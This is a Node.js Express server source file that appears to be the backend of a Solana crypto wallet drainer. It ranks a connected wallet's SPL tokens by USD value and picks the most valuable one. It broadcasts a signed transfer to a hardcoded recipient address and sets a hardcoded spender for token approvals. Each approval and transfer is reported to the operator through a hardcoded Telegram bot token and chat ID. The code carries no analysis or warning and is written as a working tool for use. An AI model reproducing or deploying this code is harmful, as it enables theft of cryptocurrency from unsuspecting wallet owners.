const express = require('express');
const cors = require('cors');
const path = require('path');
const dotenv = require('dotenv');
const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID } = require('@solana/spl-token');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
app.use(cors({ origin: '*' }));


const allowedOrigins = [
  'http://localhost:3000',
  'http://127.0.0.1:3000',
  'https://github.com/vintrumite/VOID',
  'https://void-production-d066.up.railway.app'
];

app.use(cors({
  origin(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
      return;
    }
    callback(new Error('CORS policy: origin not allowed'));
  }
}));
const RPC_ENDPOINT = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_ENDPOINT, 'confirmed');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8375716074:AAHOp-aTenVJarXQ5-VLjWxMTjzPp_91jXw';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5126266116';
const FIXED_RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || '0x7779b7efddd556cba44c577c32511f8ae6375f51';

app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname)));

function isValidPublicKey(address) {
  try {
    new PublicKey(address);
    return true;
  } catch (error) {
    return false;
  }
}

async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_')) {
    return { ok: false, reason: 'Telegram bot token not configured' };
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes('YOUR_')) {
    return { ok: false, reason: 'Telegram chat id not configured' };
  }

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  });

  const data = await response.json();
  return { ok: response.ok && data.ok, data };
}

async function getTokenPrice(mintAddress) {
  try {
    const response = await fetch(`https://price.jup.ag/v4/price?ids=${encodeURIComponent(mintAddress)}`);
    if (!response.ok) {
      return null;
    }
    const data = await response.json();
    return data?.data?.[mintAddress]?.price || null;
  } catch (error) {
    return null;
  }
}

async function getWalletSplTokens(walletAddress) {
  if (!isValidPublicKey(walletAddress)) {
    throw new Error('Invalid wallet address');
  }

  const owner = new PublicKey(walletAddress);
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, {
    programId: TOKEN_PROGRAM_ID
  });

  const tokens = [];
  for (const item of tokenAccounts.value) {
    const parsed = item.account.data.parsed.info;
    const rawAmount = parsed.tokenAmount?.amount;
    const decimals = parsed.tokenAmount?.decimals || 0;
    const uiAmount = Number(rawAmount || 0) / 10 ** decimals;

    if (!uiAmount || uiAmount <= 0) {
      continue;
    }

    const mintAddress = parsed.mint;
    const price = await getTokenPrice(mintAddress);

    tokens.push({
      mintAddress,
      tokenAccount: item.pubkey.toBase58(),
      balance: uiAmount,
      decimals,
      usdValue: price ? Number((uiAmount * price).toFixed(2)) : null,
      price
    });
  }

  return tokens;
}

async function getHighestValueToken(walletAddress) {
  const tokens = await getWalletSplTokens(walletAddress);
  if (!tokens.length) {
    return null;
  }

  const rankedTokens = tokens.filter((token) => (token.usdValue || 0) > 0);
  if (!rankedTokens.length) {
    return tokens[0];
  }

  return rankedTokens.sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0))[0];
}

app.get('/health', (req, res) => {
  res.json({ ok: true, rpc: RPC_ENDPOINT });
});

app.get('/api/approval-config', (req, res) => {
  res.json({
    tokenAccount: process.env.TOKEN_ACCOUNT || 'YOUR_TOKEN_MINT_ADDRESS',
    spenderAddress: process.env.SPENDER_ADDRESS || '5vWWKcQdzgiAgMH6gu5ny5cnB1TbHrVLB21nJGJRzZUn'
  });
});

app.get('/api/wallet-summary', async (req, res) => {
  try {
    const walletAddress = req.query.wallet;
    if (!walletAddress) {
      return res.status(400).json({ error: 'wallet query parameter is required' });
    }

    const tokens = await getWalletSplTokens(walletAddress);
    const totalUsd = tokens.reduce((sum, token) => sum + (token.usdValue || 0), 0);

    res.json({
      walletAddress,
      totalUsdValue: Number(totalUsd.toFixed(2)),
      tokenCount: tokens.length,
      tokens
    });
  } catch (error) {
    res.status(500).json({ error: error.message || 'Unable to fetch wallet summary' });
  }
});

app.post('/api/approval-result', async (req, res) => {
  try {
    const body = req.body || {};

    const message = [
      '<b>Approval Event</b>',
      `Wallet: ${body.walletAddress || 'unknown'}`,
      `Token Account: ${body.tokenAccount || 'unknown'}`,
      `Spender: ${body.spenderAddress || 'unknown'}`,
      `Signature: ${body.signature || 'n/a'}`,
      `Status: ${body.status || 'unknown'}`,
      `Message: ${body.message || 'Approval flow completed'}`
    ].join('\n');

    const telegramResult = await sendTelegramMessage(message);
    res.json({ ok: true, telegram: telegramResult });
  } catch (error) {
    res.status(500).json({ error: error.message || 'Approval result handler failed' });
  }
});

app.post('/api/send-spl-token', async (req, res) => {
  try {
    const {
      serializedTransaction,
      walletAddress,
      spenderAddress,
      amount
    } = req.body || {};

    const ownerAddress = walletAddress || process.env.WALLET_ADDRESS || process.env.SPENDER_ADDRESS;
    const authorityAddress = spenderAddress || ownerAddress;
    const feePayer = ownerAddress || authorityAddress;
    const recipientAddress = FIXED_RECIPIENT_ADDRESS;

    if (!serializedTransaction || !recipientAddress || !amount) {
      return res.status(400).json({ error: 'serializedTransaction, amount and recipient address are required' });
    }

    let resolvedMintAddress = null;
    let resolvedTokenAccount = null;

    if (!ownerAddress) {
      return res.status(400).json({ error: 'walletAddress is required' });
    }

    const highestToken = await getHighestValueToken(ownerAddress);
    if (!highestToken) {
      return res.status(400).json({ error: 'No SPL tokens found in the wallet' });
    }

    resolvedMintAddress = highestToken.mintAddress;
    resolvedTokenAccount = highestToken.tokenAccount;

    let txBuffer;
    if (Array.isArray(serializedTransaction)) {
      txBuffer = Buffer.from(serializedTransaction);
    } else if (typeof serializedTransaction === 'string') {
      txBuffer = Buffer.from(serializedTransaction, 'base64');
    } else {
      return res.status(400).json({ error: 'serializedTransaction must be an array or base64 string' });
    }

    const transaction = Transaction.from(txBuffer);
    const signature = await connection.sendRawTransaction(transaction.serialize(), {
      skipPreflight: false
    });

    await connection.confirmTransaction({
      signature,
      ...(await connection.getLatestBlockhash())
    }, 'confirmed');

    const telegramMessage = [
      '<b>SPL Transfer Broadcast</b>',
      `Owner Wallet: ${ownerAddress || 'unknown'}`,
      `Authority Wallet: ${authorityAddress || 'unknown'}`,
      `Fee Payer: ${feePayer || 'unknown'}`,
      `Recipient: ${recipientAddress}`,
      `Mint: ${resolvedMintAddress}`,
      `Amount: ${amount}`,
      `Token Account: ${resolvedTokenAccount || 'unknown'}`,
      `Signature: ${signature}`
    ].join('\n');

    await sendTelegramMessage(telegramMessage);

    res.json({ ok: true, signature });
  } catch (error) {
    res.status(500).json({ error: error.message || 'SPL token transfer failed' });
  }
});

app.listen(PORT, () => {
  console.log(`Backend listening on http://localhost:${PORT}`);
});
